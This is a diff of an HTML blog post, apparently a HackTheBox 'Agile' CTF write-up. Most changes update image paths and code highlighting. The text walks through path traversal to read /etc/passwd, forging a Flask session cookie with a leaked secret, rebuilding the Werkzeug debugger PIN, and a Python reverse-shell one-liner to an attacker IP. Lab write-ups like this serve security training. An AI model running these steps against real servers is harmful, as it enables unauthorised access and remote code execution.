@@ -81,77 +81,101 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;We see superpass as a super password manager:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/SuperpassHomepage.png&#34;
-	
-	
-	
+&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/SuperpassHomepage.png&#34;
+	width=&#34;1270&#34;
+	height=&#34;596&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/SuperpassHomepage_hu826a0ec889d5437b4bd851768303d960_424550_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/SuperpassHomepage_hu826a0ec889d5437b4bd851768303d960_424550_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Home Page&#34;
 	
 	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;213&#34;
+		data-flex-basis=&#34;511px&#34;
+	
 &gt;&lt;/p&gt;
 &lt;p&gt;Trying to login with generic credentials does not succeed, but we are able to register an account, &lt;code&gt;asdf:asdf&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/Register.png&#34;
-	
-	
-	
+&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/Register.png&#34;
+	width=&#34;490&#34;
+	height=&#34;410&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/Register_hu65f5ae6f9219bfa52dc760b5f78f2b89_19649_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/Register_hu65f5ae6f9219bfa52dc760b5f78f2b89_19649_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;asdf registration&#34;
 	
 	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;119&#34;
+		data-flex-basis=&#34;286px&#34;
+	
 &gt;&lt;/p&gt;
 &lt;p&gt;We see a vault where we can begin to generate passwords, and label them with sites/usernames.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/PassGen.png&#34;
-	
-	
-	
+&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/PassGen.png&#34;
+	width=&#34;935&#34;
+	height=&#34;314&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/PassGen_hue81dee2fe23cfacc4f84c30424fb7100_49052_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/PassGen_hue81dee2fe23cfacc4f84c30424fb7100_49052_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Add a password&#34;
 	
 	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;297&#34;
+		data-flex-basis=&#34;714px&#34;
+	
 &gt;&lt;/p&gt;
 &lt;p&gt;The export feature is interesting, as depending on how the query is designed, we may be able to alter our request and receive unintended responses. Using burpsuite, we can intercept our traffic and get a better idea on how we are interacting with the web service.&lt;/p&gt;
 &lt;p&gt;We can see upon clicking &lt;code&gt;Export&lt;/code&gt; we are sent to the url &lt;a class=&#34;link&#34; href=&#34;http://superpass.htb/vault/export&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;http://superpass.htb/vault/export&lt;/a&gt; on a GET request:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/NoPass.png&#34;
-	
-	
-	
+&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/NoPass.png&#34;
+	width=&#34;1029&#34;
+	height=&#34;421&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/NoPass_hu5c52c7faa54f44e7e7766115fd90505e_80632_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/NoPass_hu5c52c7faa54f44e7e7766115fd90505e_80632_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;No password error&#34;
 	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;244&#34;
+		data-flex-basis=&#34;586px&#34;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;An interesting finding at this point, we see that &lt;code&gt;superpass.htb&lt;/code&gt; server
 is described as nginx. However, this /vault/export pathway is not a .php file, as visiting superpass.htb/vault/export.php results in &lt;code&gt;404 Not Found&lt;/code&gt;. We will eventually learn that this service is running from Flask, although it wasn&amp;rsquo;t apparent at first glance if you didn&amp;rsquo;t run into the common SQLAlchemy error.&lt;/p&gt;
 &lt;p&gt;Since we didn&amp;rsquo;t click the save icon when generating out password, it seems like our database is still empty.&lt;/p&gt;
 &lt;p&gt;Once we add a password, we can see the call redirects to a custom url, &lt;code&gt;download?fn=asdf_export_49adcafaf8.csv&lt;/code&gt;. We might be able to reverse the process that generates the names, but regardless we will need more information such as usernames before we could take advantage:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/Export.png&#34;
-	
-	
-	
+&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/Export.png&#34;
+	width=&#34;1030&#34;
+	height=&#34;450&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/Export_hu86a3374812d5093230f260dc0f8fcb56_105454_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/Export_hu86a3374812d5093230f260dc0f8fcb56_105454_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Burpsuite Export&#34;
 	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;228&#34;
+		data-flex-basis=&#34;549px&#34;
 	
 &gt;&lt;/p&gt;
 &lt;h3 id=&#34;arbitrary-file-read-in-download&#34;&gt;Arbitrary file read in &lt;code&gt;/download&lt;/code&gt;&lt;/h3&gt;
 &lt;p&gt;In a simpler approach, we can check if we are able to reference any file by specifying the path:
 &lt;code&gt;http://superpass.htb/download?fn=../../../../../../../etc/passwd&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;Upon visiting this link, we receive a download prompt for our file. We can proceed to visit each url we want to check then open the downloaded file individually, or we can see the output directly through burpsuite:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/etc_passwd.png&#34;
-	
-	
-	
+&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/etc_passwd.png&#34;
+	width=&#34;1026&#34;
+	height=&#34;499&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/etc_passwd_huaf9b3493daf5d0c8b1cfb6bd215835c0_135743_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/etc_passwd_huaf9b3493daf5d0c8b1cfb6bd215835c0_135743_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;/etc/passwd&#34;
 	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;205&#34;
+		data-flex-basis=&#34;493px&#34;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;In this file we can see 4 user accounts:&lt;/p&gt;
@@ -170,14 +194,18 @@ is described as nginx. However, this /vault/export pathway is not a .php file, a
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;Viewing a non-existent file we can see interesting information through the given error. The service is utilizing Werkzeug Debugger (python Flask), the download function is pulling from &lt;code&gt;/tmp/&lt;/code&gt; and the flask SECRET is also displayed:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/Error.png&#34;
-	
-	
-	
+&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/Error.png&#34;
+	width=&#34;849&#34;
+	height=&#34;611&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/Error_hu43312189c7bc801fbab5e7fc1db40361_135651_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/Error_hu43312189c7bc801fbab5e7fc1db40361_135651_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Flask Error&#34;
 	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;138&#34;
+		data-flex-basis=&#34;333px&#34;
 	
 &gt;
 Note, the SECRET is only visible when looking at the source page, or through raw output such as Burpsuite or &lt;code&gt;curl&lt;/code&gt;:&lt;/p&gt;
@@ -200,14 +228,18 @@ Note, the SECRET is only visible when looking at the source page, or through raw
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;The last section in the traceback is particularly important, as it gives a full pathway to our source files so that we might view them exploiting this &lt;code&gt;download&lt;/code&gt; vulnerability.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/Vault_views.png&#34;
-	
-	
-	
+&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/Vault_views.png&#34;
+	width=&#34;1040&#34;
+	height=&#34;635&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/Vault_views_hu238080330f1e558120f4298b662f68cb_137413_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/Vault_views_hu238080330f1e558120f4298b662f68cb_137413_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Vault Views&#34;
 	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;163&#34;
+		data-flex-basis=&#34;393px&#34;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;From here, we can enumerate all or most of the python source files by watching the imports. For example, &lt;code&gt;from superpass.services.utility_service import get_random&lt;/code&gt; tells us that there is a python file accessible at &lt;code&gt;/app/app/superpass/services/utility_service.py&lt;/code&gt;. We can also determine that the main &lt;code&gt;app.py&lt;/code&gt; file will be located at &lt;code&gt;/app/app/superpass/app.py&lt;/code&gt;, based on where the import path is starting.&lt;/p&gt;
@@ -289,14 +321,18 @@ I find my answer in
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;Visiting a &lt;a class=&#34;link&#34; href=&#34;https://www.kirsle.net/wizards/flask-session.cgi&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;Flask cookie decoder online tool&lt;/a&gt;, we can decode without issue into something more readable:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/DecodeCookie.png&#34;
-	
-	
-	
+&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/DecodeCookie.png&#34;
+	width=&#34;1389&#34;
+	height=&#34;540&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/DecodeCookie_hu7d6aaa1ef0792b2927bc3687d3b5ef4e_135451_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/DecodeCookie_hu7d6aaa1ef0792b2927bc3687d3b5ef4e_135451_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Flask Decoded&#34;
 	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;257&#34;
+		data-flex-basis=&#34;617px&#34;
 	
 &gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -328,13 +364,13 @@ I find my answer in
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;┌──(kali㉿kali)-&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;~/Documents/Agile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;└─$&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;cat&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;tosign.txt&lt;/span&gt;                                      
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;_fresh&amp;#39;:&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;True,&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;#39;_id&amp;#39;:&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;#39;733e330a7ec9ed6ea424339019f73647f4f22319da996eaf78681272ca26abade76c7a9a39a9d707694d6f8f6029c04482e187b5d984638a563f715026db9c96&amp;#39;,&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;#39;_user_id&amp;#39;:&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──(kali㉿kali)-[~/Documents/Agile]
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─$ cat tosign.txt                                      
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{&amp;#39;_fresh&amp;#39;: True, &amp;#39;_id&amp;#39;: &amp;#39;733e330a7ec9ed6ea424339019f73647f4f22319da996eaf78681272ca26abade76c7a9a39a9d707694d6f8f6029c04482e187b5d984638a563f715026db9c96&amp;#39;, &amp;#39;_user_id&amp;#39;: &amp;#39;0&amp;#39;}
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                                                                                                                                                                                                                            
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;┌──(kali㉿kali)-&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;~/Documents/Agile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;└─$&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;flask-unsign&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;-s&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;-S&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;#39;tDxE&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;kBphctDjlZ&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;DvYf&amp;#39;&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;--cookie&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;tosign.txt&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;InRvc&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;lnbi&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;eHQi.ZMqw&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;Q.zmr&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;nM&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;FEIqwYykzEMSZnSCCPsk&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──(kali㉿kali)-[~/Documents/Agile]
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─$ flask-unsign -s -S &amp;#39;tDxE1kBphctDjlZ1DvYf&amp;#39; --cookie tosign.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;InRvc2lnbi50eHQi.ZMqw8Q.zmr3nM3FEIqwYykzEMSZnSCCPsk
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;Unfortunately, trying to use this cookie resulted in a failure. Presumably, the &lt;code&gt;_id&lt;/code&gt; hash no longer correlates to &lt;code&gt;_user_id&lt;/code&gt; value and the cookie session becomes invalid.&lt;/p&gt;
@@ -362,25 +398,33 @@ I find my answer in
 &lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
 &lt;h3 id=&#34;recreating-werkzeugs-debugger-pin&#34;&gt;Recreating Werkzeug&amp;rsquo;s Debugger PIN&lt;/h3&gt;
 &lt;p&gt;Eventually I turn myself to the system&amp;rsquo;s active &lt;code&gt;debugger&lt;/code&gt; mode. We noticed that this is turned on, since when we requested to download a file that didn&amp;rsquo;t exist, we saw detailed traceback. From these error pages, we can open an interactive terminal by clicking on the console icon available when hovering over one of the code lines:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/ConsoleOption.png&#34;
-	
-	
-	
+&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/ConsoleOption.png&#34;
+	width=&#34;981&#34;
+	height=&#34;557&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/ConsoleOption_huec404b7928046aa9cdf0fa39e9d2f401_130160_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/ConsoleOption_huec404b7928046aa9cdf0fa39e9d2f401_130160_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Console Option Available&#34;
 	
 	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;176&#34;
+		data-flex-basis=&#34;422px&#34;
+	
 &gt;&lt;/p&gt;
 &lt;p&gt;However, in order to prevent any random user from executing shell commands, a customized PIN is generated when the web server is launched. This is PIN is intended to be accessible only to the operators on the machine. The PIN is provided to console output, not saved in any guessable location.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/PIN_Ask.png&#34;
-	
-	
-	
+&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/PIN_Ask.png&#34;
+	width=&#34;453&#34;
+	height=&#34;243&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/PIN_Ask_hud27b33b5378e3711ea7139b0ade81bfb_24639_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/PIN_Ask_hud27b33b5378e3711ea7139b0ade81bfb_24639_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;PIN requirement&#34;
 	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;186&#34;
+		data-flex-basis=&#34;447px&#34;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;There is a &lt;a class=&#34;link&#34; href=&#34;https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
@@ -426,14 +470,18 @@ I find my answer in
 Private Bits:&lt;/li&gt;
 &lt;li&gt;When accessing &lt;code&gt;/sys/class/net/eth0/address&lt;/code&gt;, we get id 00:50:56:b9:ce:53:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/Address.png&#34;
-	
-	
-	
+&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/Address.png&#34;
+	width=&#34;1008&#34;
+	height=&#34;407&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/Address_huebf88bfd079d725e8013e4beab88de78_87475_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/Address_huebf88bfd079d725e8013e4beab88de78_87475_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;eth0 address&#34;
 	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;247&#34;
+		data-flex-basis=&#34;594px&#34;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;To convert into the private bit variable, we utilize python to print:&lt;/p&gt;
@@ -450,38 +498,50 @@ Private Bits:&lt;/li&gt;
 &lt;/div&gt;&lt;ul&gt;
 &lt;li&gt;Machine ID is a combination of &lt;code&gt;/etc/machine-id&lt;/code&gt; and the last section of &lt;code&gt;/proc/self/cgroup&lt;/code&gt;. Visiting &lt;code&gt;/etc/machine-id&lt;/code&gt;:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/Machine.png&#34;
-	
-	
-	
+&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/Machine.png&#34;
+	width=&#34;1025&#34;
+	height=&#34;401&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/Machine_hu53c11c5f124719d3d0c46fc67532da17_87697_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/Machine_hu53c11c5f124719d3d0c46fc67532da17_87697_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Machine ID&#34;
 	
 	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;255&#34;
+		data-flex-basis=&#34;613px&#34;
+	
 &gt;&lt;/p&gt;
 &lt;p&gt;Visiting &lt;code&gt;/proc/self/cgroup&lt;/code&gt;:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/cgroup.png&#34;
-	
-	
-	
+&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/cgroup.png&#34;
+	width=&#34;1033&#34;
+	height=&#34;404&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/cgroup_huba6577155503344ccb218ade7a6ff7e2_88123_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/cgroup_huba6577155503344ccb218ade7a6ff7e2_88123_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;cgroup&#34;
 	
 	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;255&#34;
+		data-flex-basis=&#34;613px&#34;
+	
 &gt;&lt;/p&gt;
 &lt;p&gt;The combined bit is &lt;code&gt;ed5b159560f54721827644bc9b220d00superpass.service&lt;/code&gt;&lt;/p&gt;
 &lt;h3 id=&#34;remote-code-execution-as-www-data&#34;&gt;Remote Code Execution as &lt;code&gt;www-data&lt;/code&gt;&lt;/h3&gt;
 &lt;p&gt;Now with a debug PIN correctly generated, we can finally access the debugging console by clicking the interactive icon on any code in the error:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/consoleready.png&#34;
-	
-	
-	
+&lt;p&gt;&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/consoleready.png&#34;
+	width=&#34;497&#34;
+	height=&#34;123&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/consoleready_hu4d54c3d283ece5b4e49068b80c43de4b_17165_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-agile/Images/consoleready_hu4d54c3d283ece5b4e49068b80c43de4b_17165_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;debug active&#34;
 	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;404&#34;
+		data-flex-basis=&#34;969px&#34;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;10.10.14.133&amp;quot;,8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt;&lt;/p&gt;
@@ -530,14 +590,14 @@ Private Bits:&lt;/li&gt;
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;(venv) www-data@agile:/app/app$ ^Z
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;zsh: suspended  nc -nvlp 8888
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;venv&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; www-data@agile:/app/app$ ^Z
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;zsh: suspended  nc -nvlp &lt;span class=&#34;m&#34;&gt;8888&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                                                                                                                                         
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──(kali㉿kali)-[~/Documents/Agile]
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─$ stty raw -echo; fg 
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[1]  + continued  nc -nvlp 8888
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/Documents/Agile&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─$ stty raw -echo&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;fg&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  + continued  nc -nvlp &lt;span class=&#34;m&#34;&gt;8888&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;(venv) www-data@agile:/app/app$
